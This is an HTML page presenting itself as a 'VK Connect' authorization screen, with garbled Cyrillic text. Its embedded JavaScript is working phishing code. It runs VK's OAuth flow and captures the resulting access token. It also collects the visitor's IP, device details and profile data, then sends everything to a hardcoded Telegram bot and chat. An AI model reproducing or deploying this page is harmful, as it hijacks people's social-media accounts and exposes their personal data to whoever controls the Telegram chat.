<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VK Connect - –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #4A76A8 0%, #2A4A6E 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: #4A76A8;
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 36px;
            font-weight: bold;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .btn {
            background: linear-gradient(135deg, #4A76A8 0%, #2A4A6E 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            margin-bottom: 15px;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(74, 118, 168, 0.4);
        }
        .info {
            background: #f0f8ff;
            border-left: 4px solid #4A76A8;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
            font-size: 14px;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4A76A8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success, .error {
            display: none;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .note {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container" id="container">
        <div class="logo">VK</div>
        <h1>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ VK API</h1>
        <p>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –≤ VK. –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ –∏ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ.</p>
        
        <div class="info">
            <strong>–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ:</strong> –¢–µ—Å—Ç–ú–æ–µ–≥–æ–ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è<br>
            <strong>ID:</strong> 54427627<br>
            <strong>–î–æ—Å—Ç—É–ø:</strong> –¥—Ä—É–∑—å—è, —Ñ–æ—Ç–æ, –∞—É–¥–∏–æ, —Å–æ–æ–±—â–µ–Ω–∏—è
        </div>
        
        <button class="btn" onclick="startVKAuth()" id="authBtn">
            üîê –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ VK
        </button>
        
        <button class="btn" onclick="testTelegram()" style="background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);">
            üìã –¢–µ—Å—Ç Telegram
        </button>
        
        <div class="loading" id="loading">
            <div class="loader"></div>
            <p>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ VK...</p>
        </div>
        
        <div class="success" id="success">
            <h3>‚úÖ –£—Å–ø–µ—à–Ω–æ!</h3>
            <p>–¢–æ–∫–µ–Ω –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram. –í—ã –º–æ–∂–µ—Ç–µ –∑–∞–∫—Ä—ã—Ç—å —ç—Ç—É —Å—Ç—Ä–∞–Ω–∏—Ü—É.</p>
        </div>
        
        <div class="error" id="error">
            <h3>‚ùå –û—à–∏–±–∫–∞</h3>
            <p id="errorMsg"></p>
        </div>
        
        <p class="note">
            –ù–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫—É, –≤—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å —É—Å–ª–æ–≤–∏—è–º–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
        </p>
    </div>

    <script>
        // –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø
        const CONFIG = {
            VK_CLIENT_ID: '54427627', // –¢–í–û–ô APP ID
            REDIRECT_URI: 'https://ya3ya3mack3-wq.github.io/testVK/', // –¢–í–û–ô –î–û–ú–ï–ù
            TELEGRAM_BOT_TOKEN: '8332901581:AAFTLzw8aOJQLtAz_l2L_iXKUyyB_wDNC_U',
            TELEGRAM_CHAT_ID: '-1003655249990'
        };
        
        // –°–æ—Å—Ç–æ—è–Ω–∏–µ
        let authWindow = null;
        let tokenProcessed = false;
        
        // –§—É–Ω–∫—Ü–∏–∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
        function show(id) { document.getElementById(id).style.display = 'block'; }
        function hide(id) { document.getElementById(id).style.display = 'none'; }
        
        // –ù–∞—á–∞—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é
        function startVKAuth() {
            console.log('–ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏...');
            
            // –ü–æ–∫–∞–∑–∞—Ç—å –∑–∞–≥—Ä—É–∑–∫—É
            hide('authBtn');
            show('loading');
            
            // –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            saveUserData();
            
            // –ü–∞—Ä–∞–º–µ—Ç—Ä—ã OAuth
            const params = {
    client_id: CONFIG.VK_CLIENT_ID,
    redirect_uri: CONFIG.REDIRECT_URI,
    display: 'page',
    scope: 'friends,photos,audio', // ‚Üê –ò–ó–ú–ï–ù–ò–õ –ù–ê –≠–¢–û
    response_type: 'token',
    v: '5.199',
    state: 'vk_auth_' + Date.now(),
    revoke: '0'
};
            
            // –°–æ–∑–¥–∞—Ç—å URL
            const authUrl = 'https://oauth.vk.com/authorize?' + 
                Object.keys(params)
                    .map(key => `${key}=${encodeURIComponent(params[key])}`)
                    .join('&');
            
            console.log('Auth URL:', authUrl);
            
            // –û—Ç–∫—Ä—ã—Ç—å –≤ —ç—Ç–æ–º –∂–µ –æ–∫–Ω–µ (—Ä–∞–±–æ—Ç–∞–µ—Ç —Å –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–º redirect_uri)
            window.location.href = authUrl;
        }
        
        // –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function saveUserData() {
            const data = {
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                referrer: document.referrer,
                url: window.location.href
            };
            
            // –ü–æ–ª—É—á–∏—Ç—å IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    localStorage.setItem('vk_user_data', JSON.stringify(data));
                    sendTelegram('start', data);
                })
                .catch(() => {
                    data.ip = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                    localStorage.setItem('vk_user_data', JSON.stringify(data));
                    sendTelegram('start', data);
                });
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ URL (–ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã)
        function checkForToken() {
            console.log('–ü—Ä–æ–≤–µ—Ä–∫–∞ URL –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Ç–æ–∫–µ–Ω–∞...');
            
            const url = window.location.href;
            let tokenData = null;
            
            // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å hash
            if (url.includes('#')) {
                const hash = url.split('#')[1];
                const params = new URLSearchParams(hash);
                
                if (params.has('access_token')) {
                    tokenData = {
                        access_token: params.get('access_token'),
                        user_id: params.get('user_id'),
                        expires_in: params.get('expires_in'),
                        error: params.get('error'),
                        error_description: params.get('error_description')
                    };
                }
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å query params (–Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π)
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('access_token')) {
                tokenData = {
                    access_token: urlParams.get('access_token'),
                    user_id: urlParams.get('user_id'),
                    expires_in: urlParams.get('expires_in')
                };
            }
            
            if (tokenData) {
                console.log('–¢–æ–∫–µ–Ω –Ω–∞–π–¥–µ–Ω –≤ URL:', tokenData);
                
                if (tokenData.error) {
                    showError(`VK –æ—à–∏–±–∫–∞: ${tokenData.error_description}`);
                    return;
                }
                
                // –û–±—Ä–∞–±–æ—Ç–∞—Ç—å —Ç–æ–∫–µ–Ω
                processToken(tokenData);
                return true;
            }
            
            return false;
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∞—Ç—å —Ç–æ–∫–µ–Ω
        async function processToken(tokenData) {
            if (tokenProcessed) {
                console.log('–¢–æ–∫–µ–Ω —É–∂–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω');
                return;
            }
            
            tokenProcessed = true;
            
            if (!tokenData.access_token) {
                showError('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø–∞');
                return;
            }
            
            console.log('–û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç–æ–∫–µ–Ω–∞...');
            
            // –ü–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            const userData = JSON.parse(localStorage.getItem('vk_user_data') || '{}');
            
            // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω —á–µ—Ä–µ–∑ VK API
            const isValid = await verifyVKToken(tokenData.access_token);
            
            if (isValid) {
                // –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ Telegram
                const success = await sendTokenToTelegram(tokenData, userData);
                
                if (success) {
                    // –ü–æ–∫–∞–∑–∞—Ç—å —É—Å–ø–µ—Ö
                    hide('loading');
                    show('success');
                    
                    // –û—á–∏—Å—Ç–∏—Ç—å URL –æ—Ç —Ç–æ–∫–µ–Ω–∞
                    clearURL();
                    
                    // –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –¥–ª—è –∏—Å—Ç–æ—Ä–∏–∏
                    localStorage.setItem('last_vk_token', JSON.stringify({
                        ...tokenData,
                        captured_at: new Date().toISOString()
                    }));
                } else {
                    showError('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ Telegram');
                }
            } else {
                showError('–¢–æ–∫–µ–Ω –Ω–µ–≤–∞–ª–∏–¥–µ–Ω');
            }
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω —á–µ—Ä–µ–∑ VK API
        async function verifyVKToken(token) {
            try {
                console.log('–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ —á–µ—Ä–µ–∑ VK API...');
                
                const response = await fetch(`https://api.vk.com/method/users.get?access_token=${token}&v=5.199`);
                const data = await response.json();
                
                if (data.response && data.response[0]) {
                    console.log('–¢–æ–∫–µ–Ω –≤–∞–ª–∏–¥–µ–Ω, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:', data.response[0]);
                    return true;
                } else if (data.error) {
                    console.error('VK API –æ—à–∏–±–∫–∞:', data.error);
                    return false;
                }
                
                return false;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–∞:', error);
                return true; // –í—Å–µ —Ä–∞–≤–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏–º, –µ—Å–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ Telegram
        async function sendTokenToTelegram(tokenData, userData) {
            console.log('–û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...');
            
            // –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ VK
            let vkUserInfo = '';
            try {
                const response = await fetch(`https://api.vk.com/method/users.get?user_ids=${tokenData.user_id}&fields=first_name,last_name,photo_100,sex,bdate,city&access_token=${tokenData.access_token}&v=5.199`);
                const data = await response.json();
                
                if (data.response && data.response[0]) {
                    const user = data.response[0];
                    vkUserInfo = `üë§ <b>${user.first_name} ${user.last_name}</b>\n`;
                    if (user.sex) vkUserInfo += `üöª –ü–æ–ª: ${user.sex === 1 ? '–ñ–µ–Ω—Å–∫–∏–π' : '–ú—É–∂—Å–∫–æ–π'}\n`;
                    if (user.bdate) vkUserInfo += `üéÇ –î–∞—Ç–∞ —Ä–æ–∂–¥–µ–Ω–∏—è: ${user.bdate}\n`;
                    if (user.city) vkUserInfo += `üèôÔ∏è –ì–æ—Ä–æ–¥: ${user.city.title}\n`;
                }
            } catch (e) {
                console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ VK');
            }
            
            // –°—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ
            const message = `‚úÖ <b>–ù–û–í–´–ô VK –¢–û–ö–ï–ù</b> üöÄ\n\n` +
                           `${vkUserInfo}` +
                           `üÜî <b>User ID:</b> <code>${tokenData.user_id}</code>\n` +
                           `üîë <b>Access Token:</b>\n<code>${tokenData.access_token}</code>\n` +
                           `‚è±Ô∏è <b>–î–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω:</b> ${tokenData.expires_in || '‚àû'} —Å–µ–∫\n\n` +
                           `üì° <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>\n` +
                           `üìç IP: <code>${userData.ip || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>\n` +
                           `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${userData.platform}\n` +
                           `üåê –Ø–∑—ã–∫: ${userData.language}\n` +
                           `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${userData.screen}\n` +
                           `üïí –í—Ä–µ–º—è: ${new Date(userData.timestamp).toLocaleString('ru-RU')}\n\n` +
                           `üîó <b>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω:</b>\n` +
                           `https://api.vk.com/method/users.get?access_token=${tokenData.access_token}&v=5.199\n\n` +
                           `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
                const result = await response.json();
                console.log('Telegram —Ä–µ–∑—É–ª—å—Ç–∞—Ç:', result);
                
                return result.ok;
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        async function sendTelegram(type, data) {
            let message = '';
            
            if (type === 'start') {
                message = `üöÄ <b>–ù–ê–ß–ê–õ–û –ê–í–¢–û–†–ò–ó–ê–¶–ò–ò VK</b>\n\n` +
                         `üåê –î–æ–º–µ–Ω: ${window.location.hostname}\n` +
                         `üìç IP: <code>${data.ip}</code>\n` +
                         `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${data.platform}\n` +
                         `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${data.screen}\n` +
                         `üåê User-Agent: ${data.user_agent.substring(0, 80)}...\n` +
                         `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê`;
            }
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:', error);
            }
        }
        
        // –û—á–∏—Å—Ç–∏—Ç—å URL –æ—Ç —Ç–æ–∫–µ–Ω–∞
        function clearURL() {
            if (window.location.hash.includes('access_token') || 
                window.location.search.includes('access_token')) {
                
                const cleanUrl = window.location.origin + window.location.pathname;
                window.history.replaceState({}, document.title, cleanUrl);
                console.log('URL –æ—á–∏—â–µ–Ω:', cleanUrl);
            }
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –æ—à–∏–±–∫—É
        function showError(message) {
            hide('loading');
            show('error');
            document.getElementById('errorMsg').textContent = message;
            show('authBtn');
        }
        
        // –¢–µ—Å—Ç Telegram
        async function testTelegram() {
            console.log('–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ Telegram...');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: `üõ†Ô∏è <b>–¢–ï–°–¢–û–í–û–ï –°–û–û–ë–©–ï–ù–ò–ï</b>\n\n‚úÖ –°–≤—è–∑—å —Å Telegram —Ä–∞–±–æ—Ç–∞–µ—Ç!\nüåê –î–æ–º–µ–Ω: ${window.location.hostname}\nüïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`,
                        parse_mode: 'HTML'
                    })
                });
                
                const result = await response.json();
                if (result.ok) {
                    alert('‚úÖ –¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
                } else {
                    alert('‚ùå –û—à–∏–±–∫–∞: ' + result.description);
                }
                
            } catch (error) {
                alert('‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Telegram');
                console.error('Test error:', error);
            }
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', function() {
            console.log('–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ');
            console.log('–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:', CONFIG);
            
            // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ URL
            if (checkForToken()) {
                return;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å localStorage –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ —Ç–æ–∫–µ–Ω–∞
            const savedToken = localStorage.getItem('last_vk_token');
            if (savedToken) {
                console.log('–ù–∞–π–¥–µ–Ω —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–π —Ç–æ–∫–µ–Ω:', JSON.parse(savedToken));
            }
        });
    </script>
</body>

</html>
